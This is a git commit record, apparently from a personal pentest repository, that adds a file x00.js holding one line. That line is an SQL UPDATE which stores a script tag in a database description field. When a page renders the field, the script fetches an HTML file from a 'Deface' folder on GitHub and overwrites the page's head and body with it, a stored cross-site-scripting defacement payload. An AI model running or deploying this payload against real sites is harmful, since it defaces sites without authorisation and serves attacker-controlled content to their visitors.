efb2f01d0077042f712b11a8b37d844867ac81ff
Yyax13 <Yyax13@proton.me>
2025-07-03 17:39:31 -0300

    Create x00.js

---
+++ x00.js
@@ -0,0 +1,1 @@
+UPDATE cat SET descr='<script>fetch("https://raw.githubusercontent.com/Yyax13/Pentest/refs/heads/master/Presets/Deface/T404/ash1.html").then(r=>r.text()).then(t=>{document.head.innerHTML=t.split("<head>")[1].split("</head>")[0];document.body.innerHTML=t.split("<body>")[1].split("</body>")[0];});</script>' WHERE id=1;
